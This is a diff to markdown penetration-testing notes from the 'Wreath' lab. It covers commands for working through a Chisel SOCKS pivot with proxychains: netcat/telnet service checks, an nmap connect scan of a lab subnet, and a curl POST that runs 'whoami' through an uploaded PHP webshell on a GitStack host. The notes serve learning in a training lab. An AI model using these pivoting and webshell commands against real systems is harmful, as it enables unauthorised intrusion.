@@ -11,7 +11,9 @@ proxychains nc 172.16.0.100 23
 proxychains telnet 172.16.0.100 23
 ```
 
-Used on: **Wreath** - quick service reachability checks through a pivot.
+Used on: **Wreath**
+
+quick service reachability checks through a pivot.
 
 ### Scan through SOCKS
 
@@ -19,7 +21,9 @@ Used on: **Wreath** - quick service reachability checks through a pivot.
 proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
 ```
 
-Used on: **Wreath** - `-sT` was required because SYN scans do not work reliably through SOCKS.
+Used on: **Wreath**
+
+`-sT` was required because SYN scans do not work reliably through SOCKS.
 
 ### Trigger webshell commands through a pivot
 
@@ -27,7 +31,9 @@ Used on: **Wreath** - `-sT` was required because SYN scans do not work reliably 
 proxychains curl -X POST http://10.200.180.150/web/exploit-tryzub.php --data-urlencode "a=whoami"
 ```
 
-Used on: **Wreath** - executed commands on GitStack's uploaded PHP webshell through the Chisel SOCKS pivot.
+Used on: **Wreath**
+
+executed commands on GitStack's uploaded PHP webshell through the Chisel SOCKS pivot.
 
 ## Configuration
 
